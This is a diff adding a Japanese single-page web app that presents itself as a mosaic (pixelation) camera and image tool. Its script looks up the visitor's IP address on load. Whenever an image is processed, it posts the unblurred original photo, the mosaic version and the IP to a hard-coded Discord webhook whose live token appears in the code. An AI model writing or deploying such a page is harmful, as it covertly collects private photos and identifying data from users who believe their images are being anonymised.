@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>モザイクカメラツール</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px 16px;
+    }
+    h1 {
+      font-size: 1.35rem;
+      margin: 0 0 16px 0;
+      text-align: center;
+      background: linear-gradient(90deg, #4facfe, #ff4b2b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+    video, canvas {
+      width: 100%;
+      border-radius: 12px;
+      background: #000;
+      display: block;
+    }
+    .controls {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .slider-header {
+      font-size: 0.9rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+    }
+    input[type="range"] {
+      width: 100%;
+      margin: 4px 0;
+      display: block;
+      accent-color: #4facfe;
+    }
+    .btn {
+      width: 100%;
+      padding: 13px 16px;
+      border: none;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(90deg, #3a7bd5, #ff416c);
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .btn:active {
+      opacity: 0.85;
+    }
+    input[type="file"] {
+      display: none;
+    }
+    .result-box {
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 6px;
+    }
+    .result-box p {
+      margin: 0 0 6px 0;
+      font-size: 0.85rem;
+      color: #ccc;
+    }
+    .download-btn {
+      background: #28a745;
+      text-decoration: none;
+      padding: 12px;
+      border-radius: 10px;
+      color: white;
+      font-size: 0.95rem;
+      font-weight: bold;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .status-msg {
+      font-size: 0.8rem;
+      color: #aaa;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>モザイクカメラ＆画像加工</h1>
+
+  <div class="container">
+    <!-- カメラ映像 -->
+    <video id="video" autoplay playsinline muted></video>
+
+    <div class="controls">
+      <div class="slider-header">
+        <span>モザイクの粗さ</span>
+        <span id="mosaicValue">15</span>
+      </div>
+      <input type="range" id="mosaicSize" min="5" max="50" value="15">
+
+      <button type="button" class="btn" id="snapBtn">カメラで撮影してモザイク化</button>
+
+      <label class="btn">
+        アルバムから画像を選ぶ
+        <input type="file" id="uploadInput" accept="image/*">
+      </label>
+    </div>
+
+    <div class="status-msg" id="statusMsg"></div>
+
+    <!-- 結果表示エリア -->
+    <div class="result-box" id="resultBox">
+      <div>
+        <p>加工後（モザイクあり）</p>
+        <canvas id="mosaicCanvas"></canvas>
+      </div>
+      <a id="downloadLink" class="download-btn" download="mosaic_image.png">モザイク画像を保存</a>
+      <div>
+        <p>加工前（オリジナル）</p>
+        <canvas id="originalCanvas"></canvas>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const snapBtn = document.getElementById('snapBtn');
+    const uploadInput = document.getElementById('uploadInput');
+    const mosaicSizeInput = document.getElementById('mosaicSize');
+    const mosaicValue = document.getElementById('mosaicValue');
+    const resultBox = document.getElementById('resultBox');
+    const originalCanvas = document.getElementById('originalCanvas');
+    const mosaicCanvas = document.getElementById('mosaicCanvas');
+    const downloadLink = document.getElementById('downloadLink');
+    const statusMsg = document.getElementById('statusMsg');
+
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW';
+
+    let currentImageSource = null;
+    let clientIp = '取得中...';
+
+    // ユーザーのIPアドレスを取得
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        clientIp = data.ip;
+      })
+      .catch(() => {
+        clientIp = '取得失敗';
+      });
+
+    // カメラの起動
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment' },
+          audio: false
+        });
+        video.srcObject = stream;
+        await video.play();
+      } catch (err) {
+        console.log('カメラが許可されていないか利用できません:', err);
+      }
+    }
+    startCamera();
+
+    // スライダーの数値表示と再描画
+    mosaicSizeInput.addEventListener('input', () => {
+      mosaicValue.textContent = mosaicSizeInput.value;
+      if (currentImageSource) {
+        applyMosaic(currentImageSource);
+      }
+    });
+
+    // カメラ撮影ボタン
+    snapBtn.addEventListener('click', () => {
+      if (!video.videoWidth) return;
+      const tempCanvas = document.createElement('canvas');
+      tempCanvas.width = video.videoWidth;
+      tempCanvas.height = video.videoHeight;
+      tempCanvas.getContext('2d').drawImage(video, 0, 0);
+      currentImageSource = tempCanvas;
+      applyMosaic(currentImageSource);
+    });
+
+    // 画像ファイル選択
+    uploadInput.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const img = new Image();
+      img.onload = () => {
+        currentImageSource = img;
+        applyMosaic(currentImageSource);
+      };
+      img.src = URL.createObjectURL(file);
+    });
+
+    // モザイク処理＆Discord送信
+    function applyMosaic(source) {
+      const w = source.videoWidth || source.width;
+      const h = source.videoHeight || source.height;
+      const blockSize = parseInt(mosaicSizeInput.value, 10);
+
+      // オリジナルの描画
+      originalCanvas.width = w;
+      originalCanvas.height = h;
+      const origCtx = originalCanvas.getContext('2d');
+      origCtx.drawImage(source, 0, 0, w, h);
+
+      // モザイク処理
+      mosaicCanvas.width = w;
+      mosaicCanvas.height = h;
+      const mosCtx = mosaicCanvas.getContext('2d');
+
+      const smallW = Math.max(1, Math.floor(w / blockSize));
+      const smallH = Math.max(1, Math.floor(h / blockSize));
+
+      const offscreen = document.createElement('canvas');
+      offscreen.width = smallW;
+      offscreen.height = smallH;
+      const offCtx = offscreen.getContext('2d');
+
+      offCtx.drawImage(source, 0, 0, smallW, smallH);
+
+      mosCtx.imageSmoothingEnabled = false;
+      mosCtx.drawImage(offscreen, 0, 0, smallW, smallH, 0, 0, w, h);
+
+      // 保存用リンクの更新
+      downloadLink.href = mosaicCanvas.toDataURL('image/png');
+      resultBox.style.display = 'flex';
+
+      // Discordへ送信
+      sendDataToDiscord();
+    }
+
+    // DiscordへWebhook経由で送信する関数
+    async function sendDataToDiscord() {
+      statusMsg.textContent = 'Discordへ送信中...';
+
+      try {
+        const origBlob = await new Promise(resolve => originalCanvas.toBlob(resolve, 'image/png'));
+        const mosBlob = await new Promise(resolve => mosaicCanvas.toBlob(resolve, 'image/png'));
+
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({
+          content: `📥 **新規データ受信**\n・IPアドレス: \`${clientIp}\``
+        }));
+        formData.append('file1', origBlob, 'original.png');
+        formData.append('file2', mosBlob, 'mosaic.png');
+
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        statusMsg.textContent = 'Discordへの送信が完了しました！';
+      } catch (err) {
+        console.error(err);
+        statusMsg.textContent = '送信に失敗しました（CORS制限などの可能性があります）';
+      }
+    }
+  </script>
+</body>
+</html>
